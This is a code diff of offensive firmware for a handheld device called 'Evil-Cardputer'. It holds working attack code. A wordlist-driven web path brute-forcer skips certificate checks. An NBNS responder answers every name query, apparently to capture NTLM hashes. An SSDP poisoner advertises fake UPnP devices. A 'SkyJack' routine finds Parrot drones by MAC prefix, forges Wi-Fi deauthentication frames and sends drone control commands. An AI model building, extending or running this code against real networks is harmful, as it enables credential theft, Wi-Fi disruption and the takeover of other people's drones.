+struct UrlPartsCrawl {
+  String scheme;   // "http" | "https"
+  String host;     // ipv4/host
+  uint16_t port;   // 80/443/...
+  String path;     // commence toujours par '/'
+};
+
+static std::vector<String> urlList;     // Liste scrollable
+static int startIndex = 0;
+static const int maxDisplayLines = 11;
+static String urlBase = "";
+
+// ===============================
+// Helpers d'affichage
+// ===============================
 void displayUrls() {
   M5.Display.clear();
+  M5.Display.setTextSize(1);
   M5.Display.setCursor(0, 0);
 
-  int displayCount = std::min(maxDisplayLines, (int)urlList.size());
+  const int total = (int)urlList.size();
+  const int displayCount = std::min(maxDisplayLines, total);
+
   for (int i = 0; i < displayCount; ++i) {
-    int displayIndex = (startIndex + i) % urlList.size();
+    int displayIndex = (startIndex + i) % (total == 0 ? 1 : total);
     M5.Display.setCursor(0, 10 + i * 10);
-    M5.Display.println(urlList[displayIndex]);
+    if (total > 0) M5.Display.println(urlList[displayIndex]);
   }
 
-  // Display position indicator
   M5.Display.setCursor(0, 0);
-  M5.Display.printf(" %d-%d of %d on %s\n", startIndex + 1, startIndex + displayCount, urlList.size(), urlBase.c_str());
+  M5.Display.printf(" %d-%d of %d on %s\n",
+                    total == 0 ? 0 : startIndex + 1,
+                    total == 0 ? 0 : startIndex + displayCount,
+                    total, urlBase.c_str());
 }
 
 void addUrl(const String &url) {
+  for (const auto &u : urlList) if (u == url) { displayUrls(); return; }
   urlList.push_back(url);
-  if (urlList.size() > maxDisplayLines) {
-    startIndex = urlList.size() - maxDisplayLines;
-  }
+  if ((int)urlList.size() > maxDisplayLines) startIndex = urlList.size() - maxDisplayLines;
   displayUrls();
 }
 
-void scrollUp() {
-  if (startIndex > 0) {
-    startIndex--;
-    displayUrls();
+void scrollUp()   { if (startIndex > 0) { startIndex--; displayUrls(); } }
+void scrollDown() { if (startIndex + maxDisplayLines < (int)urlList.size()) { startIndex++; displayUrls(); } }
+
+// ===============================
+// Parsing/Build/Resolve URL
+// ===============================
+inline bool isDigitCharCrawl(char c){ return (c >= '0' && c <= '9'); }
+
+bool parseUrlCrawl(const String &inputRaw, UrlPartsCrawl &out) {
+  String s = inputRaw; s.trim();
+
+  int schemePos = s.indexOf("://");
+  if (schemePos >= 0) {
+    out.scheme = s.substring(0, schemePos);
+    s = s.substring(schemePos + 3);
+  } else {
+    out.scheme = "http";
   }
-}
+  out.scheme.toLowerCase();
 
-void scrollDown() {
-  if (startIndex + maxDisplayLines < urlList.size()) {
-    startIndex++;
-    displayUrls();
+  String hostPort, path;
+  int slashPos = s.indexOf('/');
+  if (slashPos >= 0) {
+    hostPort = s.substring(0, slashPos);
+    path     = s.substring(slashPos);
+  } else {
+    hostPort = s;
+    path     = "/";
   }
+
+  int colonPos = hostPort.indexOf(':');
+  if (colonPos >= 0) {
+    out.host = hostPort.substring(0, colonPos);
+    String portStr = hostPort.substring(colonPos + 1);
+    int i = 0; while (i < (int)portStr.length() && isDigitCharCrawl(portStr[i])) i++;
+    out.port = (uint16_t)portStr.substring(0, i).toInt();
+  } else {
+    out.host = hostPort;
+    out.port = 0;
+  }
+  if (out.host.length() == 0) return false;
+
+  out.path = path.length() ? path : "/";
+  if (!out.path.startsWith("/")) out.path = "/" + out.path;
+  if (out.port == 0) out.port = (out.scheme == "https") ? 443 : 80;
+
+  return true;
 }
 
-void webCrawling(const IPAddress &ip) {
-  webCrawling(ip.toString());
+String buildUrlCrawl(const UrlPartsCrawl &u) {
+  bool nonDefault = (u.scheme == "http"  && u.port != 80) ||
+                    (u.scheme == "https" && u.port != 443);
+  String url; url.reserve(16 + u.host.length() + u.path.length());
+  url  = u.scheme + "://" + u.host;
+  if (nonDefault) { url += ":"; url += String(u.port); }
+  url += u.path;
+  return url;
 }
 
-bool handleHttpResponse(HTTPClient &http, String &url) {
-  int httpCode = http.GET();
-  if (httpCode == 301 || httpCode == 302) {
-    String newLocation = http.getLocation();
-    if (confirmPopup("Redirection detected. Follow?\n" + newLocation)) {
-      M5.Display.setTextSize(1);
-      url = newLocation.startsWith("") ? url.substring(0, url.indexOf('/', 8)) + newLocation : newLocation;
+String resolveRedirectCrawl(const UrlPartsCrawl &base, const String &locationRaw) {
+  String loc = locationRaw; loc.trim();
+  if (loc.length() == 0) return buildUrlCrawl(base);
+
+  if (loc.startsWith("http://") || loc.startsWith("https://")) return loc;
+  if (loc.startsWith("//")) return base.scheme + ":" + loc;
+
+  if (loc.startsWith("/")) {
+    UrlPartsCrawl u = base; u.path = loc;
+    return buildUrlCrawl(u);
+  }
+
+  String baseDir = base.path;
+  int lastSlash = baseDir.lastIndexOf('/');
+  baseDir = (lastSlash >= 0) ? baseDir.substring(0, lastSlash + 1) : "/";
+
+  String combined = baseDir + loc;
+  while (combined.indexOf("/./") >= 0) combined.replace("/./", "/");
+
+  int idx;
+  while ((idx = combined.indexOf("/../")) > 0) {
+    int prev = combined.lastIndexOf('/', idx - 1);
+    if (prev >= 0) combined.remove(prev, idx - prev + 3);
+    else break;
+  }
+
+  UrlPartsCrawl u = base; u.path = combined.startsWith("/") ? combined : ("/" + combined);
+  return buildUrlCrawl(u);
+}
+
+// ===============================
+// HTTP helpers
+// ===============================
+void setupHttpClientCrawl(HTTPClient &http, WiFiClient &client, WiFiClientSecure &sclient,
+                          const UrlPartsCrawl &u) {
+  if (u.scheme == "https") {
+    sclient.setInsecure();
+    http.begin(sclient, u.host, u.port, u.path, true);
+  } else {
+    http.begin(client, u.host, u.port, u.path);
+  }
+  http.setTimeout(HTTP_TIMEOUT_MS);
+#if defined(HTTPCLIENT_1_1_COMPATIBLE) || defined(ESP32)
+  http.setFollowRedirects(HTTPC_DISABLE_FOLLOW_REDIRECTS);
+#endif
+}
+
+bool httpGetWithRedirectsCrawl(UrlPartsCrawl &url, int &lastCode) {
+  WiFiClient client;
+  WiFiClientSecure sclient;
+  UrlPartsCrawl cur = url;
+
+  for (uint8_t hop = 0; hop <= MAX_REDIRECTS; ++hop) {
+    HTTPClient http;
+    setupHttpClientCrawl(http, client, sclient, cur);
+    lastCode = http.GET();
+    Serial.printf("[HTTP] GET %s -> %d\n", buildUrlCrawl(cur).c_str(), lastCode);
+
+    if (lastCode == 200) {
+      http.end();
+      url = cur;
       return true;
     }
+
+    if (lastCode == 301 || lastCode == 302 || lastCode == 303 || lastCode == 307 || lastCode == 308) {
+      String loc = http.getLocation();
+      http.end();
+
+      if (!confirmPopup("Redirection detected.\nFollow?\n" + loc)) return false;
+      String newAbs = resolveRedirectCrawl(cur, loc);
+      UrlPartsCrawl next;
+      if (!parseUrlCrawl(newAbs, next)) {
+        Serial.println(F("[HTTP] Invalid redirect URL"));
+        return false;
+      }
+      cur = next;
+      continue;
+    }
+
+    http.end();
+    return false;
   }
-  return (httpCode == 200);
+
+  Serial.println(F("[HTTP] Too many redirects"));
+  return false;
 }
 
-void setupHttpClient(HTTPClient &http, WiFiClient &client, WiFiClientSecure &secureClient, String &url) {
-  if (url.startsWith("https://")) {
-    secureClient.setInsecure();
-    http.begin(secureClient, url);
-  } else {
-    http.begin(client, url);
-  }
-  http.setTimeout(200); // Set timeout to 500 milliseconds
-}
+// ===============================
+// Entrées publiques
+// ===============================
+void webCrawling(const IPAddress &ip) { webCrawling(ip.toString()); }
 
 void webCrawling(const String &urlOrIp) {
   if (WiFi.localIP().toString() == "0.0.0.0") {
     waitAndReturnToMenu("Not connected...");
     return;
   }
+
   enterDebounce();
   startIndex = 0;
-  urlList.clear();  // Clear the URL list at the start of crawling
+  urlList.clear();
   M5.Display.setTextColor(WHITE, BLACK);
   M5.Display.setTextSize(1);
 
-  // Mettre à jour la variable globale `urlBase`
-  if (urlOrIp.isEmpty()) {
+  String inputBase = urlOrIp;
+  if (inputBase.isEmpty()) {
     M5.Display.clear();
     M5.Display.setCursor(0, 10);
-    M5.Display.println("Enter IP or Domain:");
-    urlBase = getUserInput();
+    M5.Display.println("Enter IP/Domain[:port]:");
+    inputBase = getUserInput();
     M5.Display.setTextSize(1);
-  } else {
-    urlBase = urlOrIp;
   }
 
-  // Vérifier si l'entrée utilisateur est une adresse IP valide
-  IPAddress ip;
-  if (ip.fromString(urlBase)) {
-    urlBase = "http://" + urlBase;
-  } else if (!urlBase.startsWith("http://") && !urlBase.startsWith("https://")) {
-    urlBase = "http://" + urlBase;
+  IPAddress ipTmp;
+  if (ipTmp.fromString(inputBase)) {
+    inputBase = "http://" + inputBase;
+  } else if (!inputBase.startsWith("http://") && !inputBase.startsWith("https://")) {
+    inputBase = "http://" + inputBase;
   }
 
-  WiFiClient client;
-  WiFiClientSecure secureClient;
-  HTTPClient http;
-  bool urlAccessible = false;
+  UrlPartsCrawl base;
+  if (!parseUrlCrawl(inputBase, base)) {
+    waitAndReturnToMenu("Invalid URL/IP");
+    return;
+  }
 
-  setupHttpClient(http, client, secureClient, urlBase);
-  if (handleHttpResponse(http, urlBase)) {
-    urlAccessible = true;
-  } else if (urlBase.startsWith("http://") && confirmPopup("HTTP not accessible. Try HTTPS?")) {
-    M5.Display.setTextSize(1);
-    M5.Display.clear();
-    M5.Display.setCursor(0, 10);
-    M5.Display.println("Setup Https...");
-    urlBase.replace("http://", "https://");
-    setupHttpClient(http, client, secureClient, urlBase);
-    if (handleHttpResponse(http, urlBase)) {
-      urlAccessible = true;
+  urlBase = buildUrlCrawl(base);
+
+  M5.Display.clear();
+  M5.Display.setCursor(0, 10);
+  M5.Display.println("Testing base...");
+  int code = 0;
+  bool ok = httpGetWithRedirectsCrawl(base, code);
+
+  if (!ok && base.scheme == "http") {
+    if (confirmPopup("HTTP failed. Try HTTPS?")) {
+      base.scheme = "https"; base.port = 443; base.path = "/";
+      M5.Display.clear();
+      M5.Display.setCursor(0, 10);
+      M5.Display.println("Testing HTTPS...");
+      ok = httpGetWithRedirectsCrawl(base, code);
     }
   }
 
-  if (!urlAccessible) {
+  if (!ok) {
     M5.Display.clear();
     M5.Display.setCursor(0, 10);
     M5.Display.println("URL not accessible.");
-    delay(3000);  // Afficher le message pendant 3 secondes
+    delay(2000);
     waitAndReturnToMenu("Returning to menu...");
-    return;  // Return to the menu
+    return;
   }
 
+  urlBase = buildUrlCrawl(base);
   displayUrls();
 
   File file = SD.open("/evil/crawler_wordlist.txt");
   if (!file) {
     M5.Display.clear();
     M5.Display.setCursor(0, 10);
-    M5.Display.println("Failed to open file for reading");
-    delay(2000);  // Afficher le message pendant 2 secondes
+    M5.Display.println("Failed open wordlist");
+    delay(1200);
+    waitAndReturnToMenu("Returning to menu...");
     return;
   }
 
-  Serial.println("-------- Starting crawling on :" + urlBase);
+  Serial.println("-------- Starting crawling on: " + urlBase);
+
   while (file.available()) {
     M5.update();
     M5Cardputer.update();
+
     String path = file.readStringUntil('\n');
     path.trim();
-    if (path.length() > 0) {
-      String fullUrl = urlBase;
-      if (!urlBase.endsWith("/")) {
-        fullUrl += "/";
-      }
-      fullUrl += path;
-      Serial.println("Testing path: " + fullUrl);
-      M5.Display.setCursor(0, M5.Display.height() - 10);
-      M5.Display.println("On: /" + path + "                                                             ");
-      setupHttpClient(http, client, secureClient, fullUrl);
-      if (http.GET() == 200) {
-        addUrl(path);  // Ajouter l'URL à la liste et mettre à jour l'affichage
-        Serial.println("------------------------------------ Path that respond 200 : /" + fullUrl);
-      }
+    if (path.length() == 0) continue;
+    if (!path.startsWith("/")) path = "/" + path;
+
+    UrlPartsCrawl probe = base;
+    probe.path = path;
+
+    M5.Display.setCursor(0, M5.Display.height() - 10);
+    M5.Display.printf("On: %s                               ", path.c_str());
+
+    int codeProbe = 0;
+    bool okProbe = httpGetWithRedirectsCrawl(probe, codeProbe);
+
+    if (okProbe) {
+      addUrl(probe.path);
+      Serial.println("------------------------------------ 200 : " + buildUrlCrawl(probe));
     }
+
     if (M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER)) {
       M5.Display.setCursor(0, M5.Display.height() - 10);
-      M5.Display.println("Crawling Stopped!");
+      M5.Display.println("Crawling Stopped!      ");
       enterDebounce();
-      break;  // Quitter la boucle
+      break;
     }
   }
 
   file.close();
+
   M5.Display.setCursor(0, M5.Display.height() - 10);
-  M5.Display.println("Finished Crawling!");
+  M5.Display.println("Finished Crawling!     ");
 
   while (true) {
     M5.update();
@@ -11051,24 +11515,16 @@ void webCrawling(const String &urlOrIp) {
       scrollUp();
     } else if (M5Cardputer.Keyboard.isKeyPressed('.')) {
       scrollDown();
-    } else if (M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER)) {
+    } else if (M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER) ||
+               M5Cardputer.Keyboard.isKeyPressed(KEY_BACKSPACE)) {
       urlBase = "";
       M5.Display.setTextSize(1.5);
       waitAndReturnToMenu("Returning to menu...");
-      break;  // Quitter la boucle
-    } else if (M5Cardputer.Keyboard.isKeyPressed(KEY_BACKSPACE)) {
-      M5.Display.setTextSize(1.5);
-      urlBase = "";
-      waitAndReturnToMenu("Returning to menu...");
-      return;  // Return to the menu
+      break;
     }
     delay(100);
   }
-  http.end();
-  waitAndReturnToMenu("Returning to menu...");
-  M5.Display.setTextSize(1.5);
 }
-
 
 
 
@@ -12353,7 +12809,7 @@ unsigned long lastLog = 0;
 int currentScreen   = 1;  // 1=GeneralInfo, 2=ReceivedData
 
 const String wigleHeaderFileFormat =
-  "WigleWifi-1.4,appRelease=v1.4.5,model=Cardputer,release=v1.4.5,"
+  "WigleWifi-1.4,appRelease=v1.4.6,model=Cardputer,release=v1.4.6,"
   "device=Evil-Cardputer,display=7h30th3r0n3,board=M5Cardputer,brand=M5Stack";
 
 char* log_col_names[LOG_COLUMN_COUNT] = {
@@ -19025,6 +19481,37 @@ void updateHashUI() {
   d.print(lastQueryName);
 }
 
+// Décodage NetBIOS "A..P" (32 octets) -> "NAME<XX>"
+void decodeNetBIOSLabel(const uint8_t* enc32, char* out, size_t outSize) {
+  if (!enc32 || !out || outSize == 0) return;
+  out[0] = '\0';
+
+  // Convertit 32 caractères A..P en 16 octets bruts
+  uint8_t raw[16];
+  for (int i = 0; i < 16; ++i) {
+    uint8_t c1 = enc32[2 * i];
+    uint8_t c2 = enc32[2 * i + 1];
+    uint8_t hi = (c1 >= 'A' && c1 <= 'P') ? (uint8_t)(c1 - 'A') : 0;
+    uint8_t lo = (c2 >= 'A' && c2 <= 'P') ? (uint8_t)(c2 - 'A') : 0;
+    raw[i] = (uint8_t)((hi << 4) | lo);
+  }
+
+  // 15 premiers octets = nom (paddé avec des espaces), 16e = suffixe/type
+  char name[16];
+  memcpy(name, raw, 15);
+  name[15] = '\0';
+
+  // Trim des espaces de fin
+  int end = 14;
+  while (end >= 0 && name[end] == ' ') end--;
+  name[end + 1] = '\0';
+
+  uint8_t suffix = raw[15];  // ex: 0x00 pour <00>
+
+  // Rend "NAME<XX>" (out doit être assez grand, p.ex. 40 octets)
+  // %02X fonctionne sur Arduino (printf/printf-like).
+  snprintf(out, outSize, "%s<%02X>", name, suffix);
+}
 
 
 
@@ -19078,6 +19565,11 @@ void responder() {
         // Extraire le nom encodé sur 32 octets à partir de l'offset 13 (après length byte)
         // Offset 12 = length of name (0x20), offset 13..44 = nom encodé
         if (len >= 46 && buf[12] == 0x20) {
+          char nbName[40];
+          decodeNetBIOSLabel(buf + 13, nbName, sizeof(nbName));
+          lastQueryProtocol = "NBNS";
+          lastQueryName = nbName;
+          Serial.printf("[NBNS] Query for %s from %s\n", nbName, nbnsUDP.remoteIP().toString().c_str());
           // Répondre à toute requête NBNS receivede sans vérifier le nom demandé
           uint8_t resp[80];
           // Copier Transaction ID
@@ -19131,8 +19623,8 @@ void responder() {
     uint16_t flags   = (buf[2] << 8) | buf[3];
     uint16_t qdCount = (buf[4] << 8) | buf[5];
     uint16_t anCount = (buf[6] << 8) | buf[7];
-    if ( (flags & 0x8000) || qdCount == 0 || anCount != 0) return;  // pas une question “pure”
-
+    if ( (flags & 0x8000) || qdCount == 0 || anCount != 0) continue;  //here modif return en continue 
+     
     /* 2) Lecture du premier label (on ne gère qu’un seul label simple) ---- */
     uint8_t nameLen = buf[12];
     if (nameLen == 0 || nameLen >= 64 || (13 + nameLen + 4) > len) continue;
@@ -22417,6 +22909,7 @@ struct UrlParts {
   uint16_t port = 80;
   bool https = false;
 };
+
 bool parseUrl(const String& url, UrlParts& o) {
   o = UrlParts{};
   String u = url;
@@ -24279,10 +24772,8 @@ void CleanNTLMHashes() {
 
 
 
-#include <WiFi.h>
-#include <WebServer.h>
-#include <WiFiUdp.h>
-#include <SD.h>
+
+
 #include <time.h>
 
 // === Réseau SSDP ===
@@ -24622,10 +25113,11 @@ void updateFakeSSDPUI() {
   d.print("Press BACKSPACE to exit");
 }
 
+#include "lwip/igmp.h"
 void fakeSSDP() {
   inMenu = false;
 
-  // 1. Demander combien de devices
+  // 1) Nombre de devices
   M5Cardputer.Display.fillScreen(BLACK);
   M5Cardputer.Display.setTextSize(1.5);
   M5Cardputer.Display.setTextColor(TFT_WHITE, TFT_BLACK);
@@ -24638,7 +25130,7 @@ void fakeSSDP() {
   ssdpDeviceCount = val;
   Serial.printf("[*] User selected %d devices\n", ssdpDeviceCount);
 
-  // 2. Demander SD ou custom
+  // 2) Noms depuis SD ou custom
   bool useSD = confirmPopup("Use SSDPName.txt from SD?");
   if (useSD) {
     loadDeviceNames();
@@ -24655,50 +25147,84 @@ void fakeSSDP() {
     Serial.printf("[*] Using custom name: %s\n", gNames[0]);
   }
 
-   selectTypesUI();
+  selectTypesUI();
   prepareDevices();
   registerScpdRoutesOnce();
 
   if (!isFakeSSDPActive) {
+    // --- Start ---
     server.stop();
     ssdpServer.begin();
 
-    if (udpSSDP.beginMulticast(IPAddress(239,255,255,250), 1900)) {
-      isFakeSSDPActive = true;
-      ssdpSearchCount = 0;
-      ssdpSentCount = 0;
-      lastSSDPClient = "";
-      lastSSDPService = "";
-      Serial.println("[+] SSDP Poisoner activated");
-      updateFakeSSDPUI();
-    } else {
-      Serial.println("[-] SSDP listener failed");
+    // Multicast plus fiable : désactiver power-save
+    esp_wifi_set_ps(WIFI_PS_NONE);
+
+    // Sockets locaux (durent tant que la fonction tourne)
+    WiFiUDP udpSSDPmc;   // multicast 239.255.255.250:1900
+    WiFiUDP udpSSDPuc;   // unicast/broadcast 0.0.0.0:1900 (fallback)
+
+    // STA / AP IP
+    IPAddress staIP = WiFi.localIP();
+    IPAddress apIP  = WiFi.softAPIP();
+
+    // 1) Multicast
+    if (!udpSSDPmc.beginMulticast(IPAddress(239,255,255,250), 1900)) {
+      Serial.println("[-] beginMulticast SSDP failed");
       waitAndReturnToMenu("SSDP Error");
       return;
     }
-  } else {
-    udpSSDP.stop();
-    isFakeSSDPActive = false;
-    Serial.println("[*] SSDP Poisoner stopped");
-    ssdpServer.stop();
-    server.begin();
-    waitAndReturnToMenu("SSDP Poisoner stopped");
-    return;
-  }
 
-  while (isFakeSSDPActive && !M5Cardputer.Keyboard.isKeyPressed(KEY_BACKSPACE)) {
-    int packetSize = udpSSDP.parsePacket();
-    if (packetSize > 0) {
+    // 2) Unicast/Broadcast sur 1900 (fallback si AP convertit MCast->UCast)
+    if (!udpSSDPuc.begin(1900)) {
+      Serial.println("[-] begin UDP/1900 failed");
+      waitAndReturnToMenu("SSDP Error");
+      return;
+    }
+
+    // 3) IGMP join explicite UNIQUEMENT sur STA
+    bool joined = false;
+    if (staIP.toString() != "0.0.0.0") {
+      ip4_addr_t ifaddr, multicast;
+      ifaddr.addr    = (uint32_t)staIP;
+      multicast.addr = (uint32_t)IPAddress(239,255,255,250);
+      err_t err = igmp_joingroup(&ifaddr, &multicast);
+      Serial.printf("[*] IGMP join 239.255.255.250 on %s -> err=%d\n",
+                    staIP.toString().c_str(), err);
+      joined = (err == ERR_OK);
+    } else {
+      Serial.println("[*] STA not connected -> IGMP join skipped (AP-only).");
+    }
+
+    isFakeSSDPActive = true;
+    ssdpSearchCount  = 0;
+    ssdpSentCount    = 0;
+    lastSSDPClient   = "";
+    lastSSDPService  = "";
+    Serial.println("[+] SSDP Poisoner activated");
+    updateFakeSSDPUI();
+
+    // === Boucle principale ===
+    auto handleSock = [&](WiFiUDP& sock){
+      int packetSize = sock.parsePacket();
+      if (packetSize <= 0) return;
+
       char buffer[SSDP_MAX_UDP];
-      int len = udpSSDP.read(buffer, sizeof(buffer)-1);
-      if (len > 0) buffer[len] = 0;
+      int len = sock.read(buffer, sizeof(buffer)-1);
+      if (len <= 0) return;
+      buffer[len] = 0;
 
-      if (len > 0 && strstr(buffer, "M-SEARCH")) {
+      // Détection M-SEARCH case-insensitive
+      String req(buffer);
+      int crlf = req.indexOf("\r\n");
+      String firstLine = (crlf > 0) ? req.substring(0, crlf) : req;
+      String canon = firstLine; canon.toUpperCase();
+
+      if (canon.indexOf("M-SEARCH") >= 0) {
         ssdpSearchCount++;
-        IPAddress cli = udpSSDP.remoteIP();
+        IPAddress cli = sock.remoteIP();
         lastSSDPClient = cli.toString();
 
-        String req(buffer);
+        // Extraire ST: tolérant (ST: / st:)
         String stValue = "ssdp:all";
         int stIndex = req.indexOf("\nST:");
         if (stIndex < 0) stIndex = req.indexOf("\nst:");
@@ -24711,61 +25237,882 @@ void fakeSSDP() {
         }
         lastSSDPService = stValue;
 
-        IPAddress locIP = (cli[0]==192 && cli[1]==168 && cli[2]==4) ? WiFi.softAPIP() : WiFi.localIP();
+        // Choisir IP locale pour LOCATION (si client est sur notre AP => 192.168.4.x)
+        IPAddress locIP = (cli[0]==192 && cli[1]==168 && cli[2]==4) ? apIP : staIP;
+        if (locIP.toString() == "0.0.0.0") locIP = WiFi.localIP(); // fallback
+
         String norm; SearchKind kind = classifyST(stValue, norm);
-        
+
         for (int i=0;i<ssdpDeviceCount;i++) {
-          bool doit = false;
-          if (kind == SK_All) doit = true;
-          else if (kind == SK_Root) doit = true;
-          else if (kind == SK_DevType && String(gDevs[i].type).equalsIgnoreCase(norm)) doit = true;
-          else if (kind == SK_UUID) {
-            String want = norm; want.toLowerCase();
-            String my = "uuid:" + String(gDevs[i].uuid);
-            my.toLowerCase();
-            if (my == want) doit = true;
-          }
+          bool doit = (kind == SK_All) || (kind == SK_Root) ||
+                      (kind == SK_DevType && String(gDevs[i].type).equalsIgnoreCase(norm)) ||
+                      (kind == SK_UUID && ("uuid:"+String(gDevs[i].uuid)).equalsIgnoreCase(norm));
+          if (!doit) continue;
 
-          if (doit) {
-            String loc = "http://" + locIP.toString() + ":80/desc" + String(i) + ".xml";
-            String usn;
-            if (kind == SK_Root) usn = "uuid:" + String(gDevs[i].uuid) + "::upnp:rootdevice";
-            else usn = "uuid:" + String(gDevs[i].uuid) + "::" + String(gDevs[i].type);
+          String loc = "http://" + locIP.toString() + ":80/desc" + String(i) + ".xml";
+          String usn = (kind == SK_Root)
+                        ? "uuid:" + String(gDevs[i].uuid) + "::upnp:rootdevice"
+                        : "uuid:" + String(gDevs[i].uuid) + "::" + String(gDevs[i].type);
 
-            char resp[SSDP_MAX_UDP];
-            String head =
-              "HTTP/1.1 200 OK\r\n"
-              "CACHE-CONTROL: max-age=1800\r\n"
-              "EXT:\r\n"
-              "LOCATION: " + loc + "\r\n"
-              "SERVER: ESP32/3.0 UPnP/1.0 EvilCardputer/1.4.5\r\n"
-              "ST: " + (kind==SK_Root ? "upnp:rootdevice" : String(gDevs[i].type)) + "\r\n"
-              "USN: " + usn + "\r\n"
-              "CONTENT-LENGTH: 0\r\n\r\n";
-            size_t n = head.length();
-            if (n >= sizeof(resp)) n = sizeof(resp)-1;
-            memcpy(resp, head.c_str(), n);
-            udpSSDP.beginPacket(cli, udpSSDP.remotePort());
-            udpSSDP.write((const uint8_t*)resp, n);
-            udpSSDP.endPacket();
-            ssdpSentCount++;
-            delay(1);
-          }
+          char resp[SSDP_MAX_UDP];
+          String head =
+            "HTTP/1.1 200 OK\r\n"
+            "CACHE-CONTROL: max-age=1800\r\n"
+            "EXT:\r\n"
+            "LOCATION: " + loc + "\r\n"
+            "SERVER: ESP32/3.0 UPnP/1.0 EvilCardputer/1.4.5\r\n"
+            "ST: " + (kind==SK_Root ? "upnp:rootdevice" : String(gDevs[i].type)) + "\r\n"
+            "USN: " + usn + "\r\n"
+            "CONTENT-LENGTH: 0\r\n\r\n";
+          size_t n = head.length();
+          if (n >= sizeof(resp)) n = sizeof(resp)-1;
+          memcpy(resp, head.c_str(), n);
+
+          // Répondre en unicast sur le port source du client
+          sock.beginPacket(cli, sock.remotePort());
+          sock.write((const uint8_t*)resp, n);
+          sock.endPacket();
+          ssdpSentCount++;
+          delay(1);
         }
         updateFakeSSDPUI();
       }
+    };
+
+    while (isFakeSSDPActive && !M5Cardputer.Keyboard.isKeyPressed(KEY_BACKSPACE)) {
+      handleSock(udpSSDPmc); // multicast
+      handleSock(udpSSDPuc); // unicast/broadcast
+
+      ssdpServer.handleClient();
+      handleDnsRequestSerial();
+      M5.update();
+      M5Cardputer.update();
+      delay(2);
     }
 
-    ssdpServer.handleClient();
-    handleDnsRequestSerial();
-    M5.update();
-    M5Cardputer.update();
-    delay(2);
+    // Sortie propre : leave IGMP (si join fait) + fermer sockets
+    if (joined) {
+      ip4_addr_t ifaddr, multicast;
+      ifaddr.addr    = (uint32_t)staIP;
+      multicast.addr = (uint32_t)IPAddress(239,255,255,250);
+      err_t errL = igmp_leavegroup(&ifaddr, &multicast);
+      Serial.printf("[*] IGMP leave 239.255.255.250 on %s -> err=%d\n",
+                    staIP.toString().c_str(), errL);
+    }
+    udpSSDPmc.stop();
+    udpSSDPuc.stop();
+
+    isFakeSSDPActive = false;
+    ssdpServer.stop();
+    server.begin();
+    waitAndReturnToMenu("SSDP Poisoner stopped");
+    return;
+
+  } else {
+    // --- Stop immédiat si appel en mode déjà actif (sécurité) ---
+    isFakeSSDPActive = false;
+    ssdpServer.stop();
+    server.begin();
+    waitAndReturnToMenu("SSDP Poisoner stopped");
+    return;
+  }
+}
+
+
+
+int atSeq = 1;  // compteur global pour les commandes AT
+
+// Variables statiques pour la position du texte
+static int skyjackCursorY = 20;
+const int lineHeight = 12;
+const int maxY = 135; // hauteur max écran
+const int scrollOffsetSkyjack = lineHeight;
+
+// --- Fonction d'affichage avec scroll automatique ---
+void drawSkyjackStatus(const char* msg) {
+  if (skyjackCursorY + lineHeight > maxY) {
+    // Scroll vers le haut
+    M5.Display.scroll(0, -scrollOffsetSkyjack);
+    skyjackCursorY -= scrollOffsetSkyjack;
+    // Nettoyer la nouvelle ligne du bas
+    M5.Display.fillRect(0, skyjackCursorY, 240, lineHeight, TFT_BLACK);
   }
 
-  udpSSDP.stop();
-  isFakeSSDPActive = false;
-  ssdpServer.stop();
-  server.begin();
-  waitAndReturnToMenu("SSDP Poisoner stopped");
+  M5.Display.setCursor(0, skyjackCursorY);
+  M5.Display.setTextColor(TFT_GREEN, TFT_BLACK);
+  M5.Display.setTextSize(1);
+  M5.Display.println(">> " + String(msg));
+  skyjackCursorY += lineHeight;
+
+  Serial.println("[SkyJack] " + String(msg));
+}
+
+
+// --- Génération de trame Deauth personnalisée ---
+void buildDeauthPacket(uint8_t *packet, const String& bssid) {
+  uint8_t bssid_bytes[6];
+  sscanf(bssid.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
+         &bssid_bytes[0], &bssid_bytes[1], &bssid_bytes[2],
+         &bssid_bytes[3], &bssid_bytes[4], &bssid_bytes[5]);
+
+  uint8_t temp[26] = {
+    0xC0, 0x00, 0x3A, 0x01,
+    0xff, 0xff, 0xff, 0xff, 0xff, 0xff, // broadcast
+    0,0,0,0,0,0, // source (remplacée)
+    0,0,0,0,0,0, // BSSID (remplacé)
+    0x00, 0x00
+  };
+  memcpy(temp+10, bssid_bytes, 6); // Source
+  memcpy(temp+16, bssid_bytes, 6); // BSSID
+  memcpy(packet, temp, 26);
+}
+
+// --- Envoi commande AT avec compteur ---
+void sendATCommandToDrone(WiFiClient& client, const String& command) {
+  String cmd = "AT*REF=" + String(atSeq++) + "," + command + "\r";
+  client.print(cmd);
+  Serial.println("[AT] " + cmd);
+}
+
+void skyjackDroneMode() {
+  M5.Display.clear();
+  M5.Display.setCursor(0, 20);
+  M5.Display.setTextSize(1.7);
+  M5.Display.setTextColor(TFT_GREEN);
+  drawSkyjackStatus(">> SKYJACK MODE <<");
+
+  // Étape 1 : Scan WiFi forcé canal par canal
+  WiFi.mode(WIFI_STA);
+  WiFi.disconnect(true);
+  delay(100);
+  drawSkyjackStatus(">> SKYJACK SCAN <<");
+
+  String parrotSSID = "";
+  String parrotBSSID = "";
+  int parrotChannel = -1;
+
+  for (int ch = 1; ch <= 13; ch++) {
+    drawSkyjackStatus(("Scanning CH " + String(ch)).c_str());
+    WiFi.scanNetworks(false, true, false, ch);   // scan sur un canal précis
+    delay(2000); // temps d’écoute suffisant
+    int n = WiFi.scanComplete();
+
+    if (n <= 0) continue;
+
+    for (int i = 0; i < n; i++) {
+      String bssid = WiFi.BSSIDstr(i);
+      String ssid = WiFi.SSID(i);
+
+      if (bssid.startsWith("90:03:B7") || bssid.startsWith("00:26:7E") || bssid.startsWith("A0:14:3D")) {
+        parrotSSID   = ssid;
+        parrotBSSID  = bssid;
+        parrotChannel = ch;
+        break;
+      }
+    }
+    if (parrotSSID != "") break; // drone trouvé → sortir
+  }
+
+  if (parrotSSID == "") {
+    drawSkyjackStatus("No Parrot drones found.");
+    waitAndReturnToMenu("No Parrot drones.");
+    return;
+  }
+
+  drawSkyjackStatus(("Drone: " + parrotSSID).c_str());
+  drawSkyjackStatus(("BSSID: " + parrotBSSID).c_str());
+  drawSkyjackStatus(("Channel: " + String(parrotChannel)).c_str());
+
+  // Étape 2 : Envoi Deauth
+  drawSkyjackStatus("Sending deauth...");
+
+  esp_wifi_set_promiscuous(false);
